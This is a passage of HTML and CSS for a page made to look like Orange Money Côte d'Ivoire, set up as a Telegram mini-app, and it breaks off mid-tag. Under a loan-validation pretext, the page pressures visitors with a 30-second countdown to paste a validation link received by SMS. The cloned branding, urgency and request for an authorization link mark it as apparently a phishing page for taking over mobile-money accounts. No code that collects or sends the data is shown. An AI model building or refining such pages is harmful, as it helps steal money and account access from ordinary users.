<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Orange Money Côte d'Ivoire - Vérification du Lien SMS</title>
    
    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --orange-primary: #f15a24;
            --orange-gradient: linear-gradient(180deg, #ff6b00 0%, #f15a24 100%);
            --bg-color: #f7f7f7;
            --card-bg: #ffffff;
            --text-dark: #111111;
            --text-muted: #666666;
            --border-orange: #f15a24;
            --btn-disabled-bg: #e0e0e0;
            --btn-disabled-text: #999999;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
        }

        .header-box {
            width: 100%;
            background: var(--orange-gradient);
            padding: 25px 20px 40px 20px;
            color: white;
            text-align: center;
            font-size: 26px;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .main-container {
            width: 100%;
            display: flex;
            justify-content: center;
            margin-top: -20px;
            flex-grow: 1;
        }

        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 400px;
            padding: 30px 20px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            align-self: flex-start;
        }

        h2 {
            margin: 0 0 12px 0;
            font-size: 22px;
            color: var(--text-dark);
            font-weight: 800;
            line-height: 1.2;
            text-align: center;
        }

        .instruction {
            font-size: 14px;
            color: var(--text-muted);
            margin: 0 0 16px 0;
            line-height: 1.4;
            text-align: center;
        }

        .phone-number {
            font-size: 16px;
            font-weight: 800;
            color: var(--text-dark);
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        /* SMS Link Input Area */
        .input-group {
            margin-bottom: 20px;
            display: flex;
            flex-direction: column;
        }

        .timer-condition-label {
            font-size: 13px;
            font-weight: 700;
            color: #d97706;
            background-color: #fef3c7;
            border: 1px solid #fde68a;
            padding: 10px 12px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 12px;
            line-height: 1.3;
        }

        /* Enlarged Rectangular Box for SMS Link */
        .link-textarea {
            width: 100%;
            height: 110px;
            padding: 14px 16px;
            border: 2px solid var(--border-orange);
            border-radius: 12px;
            font-size: 14px;
            outline: none;
            background-color: #ffffff;
            color: var(--text-dark);
            resize: none;
            line-height: 1.4;
            box-shadow: inset 0 1px 3px rgba(0,0,0,0.03);
        }

        .link-textarea:focus {
            box-shadow: 0 0 6px rgba(241, 90, 36, 0.4);
        }

        .submit-btn {
            width: 100%;
            background-color: var(--btn-disabled-bg);
            color: var(--btn-disabled-text);
            border: none;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 800;
            cursor: not-allowed;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            transition: background-color 0.2s;
        }

        .submit-btn.active {
            background-color: var(--orange-primary);
            color: white;
            cursor: pointer;
        }

        .submit-btn.active:hover {
            background-color: #d64d00;
        }

        .footer-banner {
            width: 100%;
            background: var(--orange-gradient);
            height: 80px;
            border-top-left-radius: 50% 30px;
            border-top-right-radius: 50% 30px;
            margin-top: 40px;
        }

        /* Overlay Styles */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: var(--orange-gradient);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: white;
            text-align: center;
            padding: 24px;
        }

        .spinner {
            width: 56px;
            height: 56px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 24px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .error-message {
            color: #e74c3c;
            font-size: 13px;
            margin-top: 10px;
            display: none;
            text-align: center;
            font-weight: 600;
        }
    </style>
</head>

<body>

<div class="header-box">
    Orange Money
</div>

<div class="main-container">
    <div class="card">
        <h2>Validation du Prêt</h2>

        <p class="instruction">
            Veuillez coller le lien de validation reçu par SMS pour finaliser votre dossier.
        </p>

        <!-- Phone display for Ivory Coast (+225) -->
        <div class="phone-number">
            <span>🇨🇮</span>
            <span id="displayPhone">+225 ...</span>
        </div>

        <div class="input-group">
            <div class="timer-condition-label">
                ⚠️ Le lien doit être collé avant <span id="countdown">30</span> secondes
            </div>

            <textarea id="sms
